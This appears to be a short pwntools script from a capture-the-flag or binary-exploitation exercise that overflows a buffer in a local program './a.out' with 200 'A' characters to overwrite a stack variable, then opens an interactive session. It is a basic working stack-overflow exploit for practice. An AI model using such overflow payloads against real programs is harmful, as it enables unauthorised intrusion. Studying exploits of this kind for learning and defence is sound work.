# Import pwntools
from pwn import *

# Establish the target process
target = process('./a.out')

# Make the payload
payload = ""
payload += "A"*200 # Padding to `local_18`

# Send the payload
target.sendline(payload)

target.interactive()
